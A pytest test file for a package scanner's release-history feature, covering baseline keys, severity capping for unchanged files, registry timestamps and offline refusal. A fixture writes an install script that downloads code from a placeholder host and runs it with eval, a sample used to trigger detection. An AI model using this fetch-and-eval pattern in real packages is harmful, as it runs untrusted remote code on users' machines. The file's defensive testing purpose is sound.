"""What an established release contained, acquired online and compared offline (`intel/release_history.py`)."""

from __future__ import annotations

import hashlib
import json
from dataclasses import replace
from datetime import UTC, datetime, timedelta

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.config import Config
from cordon_scanner.core.content import FileContent
from cordon_scanner.core.engine import Engine
from cordon_scanner.core.models import Category, Severity
from cordon_scanner.detect.base import FileUnit
from cordon_scanner.intel.release_history import Baseline, ReleaseHistory

INSTALLER = (
    b'require("https").get("https://releases.example.invalid/x.js", r => r.pipe(process.stdout));\n'
)


class HistoryKit:
    @staticmethod
    def units(installer: bytes = INSTALLER) -> list[FileUnit]:
        manifest = json.dumps({"name": "tool", "version": "2.0.0"}).encode()
        return [
            FileUnit(FileContent(path=p, raw=b, size=len(b)))
            for p, b in {
                "tool-2.0.0.tgz!package/package.json": manifest,
                "tool-2.0.0.tgz!package/install.js": installer,
            }.items()
        ]

    @staticmethod
    def suspicious(tmp_path):
        tmp_path.mkdir(parents=True, exist_ok=True)
        (tmp_path / "fetch.js").write_text(
            'const https = require("https");\n'
            'https.get("https://releases.example.invalid/tool.js", (res) => {\n'
            '  let body = "";\n  res.on("data", (p) => (body += p));\n'
            '  res.on("end", () => eval(body));\n});\n',
            encoding="utf-8",
        )
        found = [
            f
            for f in Scanner(Config.default().with_overrides(use_cache=False))
            .scan(tmp_path)
            .findings
            if f.category is Category.SUSPICIOUS and f.severity > Severity.MEDIUM
        ]
        assert found
        return replace(
            found[0], location=replace(found[0].location, path="tool-2.0.0.tgz!package/install.js")
        )

    @staticmethod
    def store(root, digest: str | None, baseline_version: str | None = "1.4.0") -> None:
        files = {"package/install.js": digest} if digest else {}
        ReleaseHistory.save(
            Baseline(
                "npm", "tool", "2.0.0", baseline_version, "2026-01-02T00:00:00+00:00", files=files
            ),
            root,
        )


class TestKeys:
    def test_the_version_in_a_root_is_written_as_a_placeholder(self) -> None:
        assert (
            ReleaseHistory.key("x-1.2.3.tar.gz!x-1.2.3/x/core.py", "1.2.3")
            == "x-{version}/x/core.py"
        )
        assert (
            ReleaseHistory.key("m.zip!example.com/m@v1.2.3/a.go", "1.2.3")
            == "example.com/m@v{version}/a.go"
        )

    def test_a_longer_version_is_not_split(self) -> None:
        assert ReleaseHistory.key("a!x-1.2.30/f", "1.2.3") == "x-1.2.30/f"

    def test_the_store_round_trips_and_refuses_another_layout(self, tmp_path) -> None:
        HistoryKit.store(tmp_path, "ab")
        loaded = ReleaseHistory.load("npm", "tool", "2.0.0", root=tmp_path)
        assert loaded is not None and loaded.files == {"package/install.js": "ab"}
        entry = next((tmp_path / "npm").iterdir())
        entry.write_text(json.dumps({"store_version": 99}), encoding="utf-8")
        assert ReleaseHistory.load("npm", "tool", "2.0.0", root=tmp_path) is None


class TestTheCeiling:
    def test_a_finding_in_a_file_unchanged_since_an_established_release_is_lowered(
        self, tmp_path
    ) -> None:
        finding = HistoryKit.suspicious(tmp_path / "s")
        HistoryKit.store(tmp_path / "h", hashlib.sha256(INSTALLER).hexdigest())
        [out] = Engine._established_release_ceiling(
            [finding], HistoryKit.units(), "npm", root=tmp_path / "h"
        )
        assert out.severity is Severity.MEDIUM
        assert "byte-identical in 1.4.0" in out.message

    def test_a_changed_file_keeps_its_grade(self, tmp_path) -> None:
        finding = HistoryKit.suspicious(tmp_path / "s")
        HistoryKit.store(tmp_path / "h", hashlib.sha256(b"older").hexdigest())
        [out] = Engine._established_release_ceiling(
            [finding], HistoryKit.units(), "npm", root=tmp_path / "h"
        )
        assert out.severity is finding.severity

    def test_nothing_acquired_changes_nothing(self, tmp_path) -> None:
        finding = HistoryKit.suspicious(tmp_path / "s")
        [out] = Engine._established_release_ceiling(
            [finding], HistoryKit.units(), "npm", root=tmp_path / "h"
        )
        assert out is finding

    def test_no_established_release_changes_nothing(self, tmp_path) -> None:
        finding = HistoryKit.suspicious(tmp_path / "s")
        HistoryKit.store(tmp_path / "h", None, baseline_version=None)
        [out] = Engine._established_release_ceiling(
            [finding], HistoryKit.units(), "npm", root=tmp_path / "h"
        )
        assert out is finding

    def test_a_malicious_finding_is_never_lowered(self, tmp_path) -> None:
        finding = replace(HistoryKit.suspicious(tmp_path / "s"), category=Category.MALICIOUS)
        HistoryKit.store(tmp_path / "h", hashlib.sha256(INSTALLER).hexdigest())
        [out] = Engine._established_release_ceiling(
            [finding], HistoryKit.units(), "npm", root=tmp_path / "h"
        )
        assert out.severity is finding.severity


class TestEstablished:
    @staticmethod
    def days(n: int) -> datetime:
        return datetime(2026, 10, 1, tzinfo=UTC) - timedelta(days=n)

    def test_the_newest_release_at_least_ninety_days_older(self, monkeypatch) -> None:
        times = {
            "2.0.0": self.days(0),
            "1.9.0": self.days(30),
            "1.4.0": self.days(120),
            "1.0.0": self.days(400),
        }
        monkeypatch.setattr(ReleaseHistory, "timeline", classmethod(lambda cls, e, n, v: times))
        assert ReleaseHistory.established("npm", "tool", "2.0.0")[0] == "1.4.0"

    def test_a_young_package_has_none(self, monkeypatch) -> None:
        times = {"2.0.0": self.days(0), "1.0.0": self.days(40)}
        monkeypatch.setattr(ReleaseHistory, "timeline", classmethod(lambda cls, e, n, v: times))
        assert ReleaseHistory.established("npm", "tool", "2.0.0") is None

    @pytest.mark.parametrize(
        ("ecosystem", "reader", "document"),
        [
            (
                "npm",
                "registry_client.RegistryClient._fetch",
                {
                    "versions": {"1.0.0": {}, "2.0.0": {}},
                    "time": {
                        "created": "2020-01-01T00:00:00Z",
                        "1.0.0": "2025-01-01T00:00:00Z",
                        "2.0.0": "2026-01-01T00:00:00Z",
                    },
                },
            ),
            (
                "pypi",
                "registry_client.RegistryClient._fetch",
                {
                    "releases": {
                        "1.0.0": [{"upload_time_iso_8601": "2025-01-01T00:00:00Z"}],
                        "2.0.0": [{"upload_time_iso_8601": "2026-01-01T00:00:00Z"}],
                    }
                },
            ),
            (
                "cargo",
                "more_registries.MoreRegistries._json",
                {
                    "versions": [
                        {"num": "1.0.0", "created_at": "2025-01-01T00:00:00Z"},
                        {"num": "2.0.0", "created_at": "2026-01-01T00:00:00Z"},
                    ]
                },
            ),
        ],
    )
    def test_registry_times_are_read(self, monkeypatch, ecosystem, reader, document) -> None:
        module, _, attribute = reader.rpartition(".")
        owner_module, _, owner = module.rpartition(".")
        import importlib

        target = getattr(importlib.import_module(f"cordon_scanner.intel.{owner_module}"), owner)
        monkeypatch.setattr(target, attribute, staticmethod(lambda *a, **k: document))
        times = ReleaseHistory.timeline(ecosystem, "tool", "2.0.0")
        assert sorted(times) == ["1.0.0", "2.0.0"]
        assert ReleaseHistory.established(ecosystem, "tool", "2.0.0")[0] == "1.0.0"


class TestAcquireIsOnlineOnly:
    def test_refused_offline(self, tmp_path, monkeypatch) -> None:
        import argparse

        from cordon_scanner.cli.main import CommandLine
        from cordon_scanner.core.errors import ConfigError

        monkeypatch.setenv("CORDON_OFFLINE", "1")
        with pytest.raises(ConfigError):
            CommandLine._intel_acquire(
                argparse.Namespace(targets=[str(tmp_path / "x.tgz")], json=False)
            )
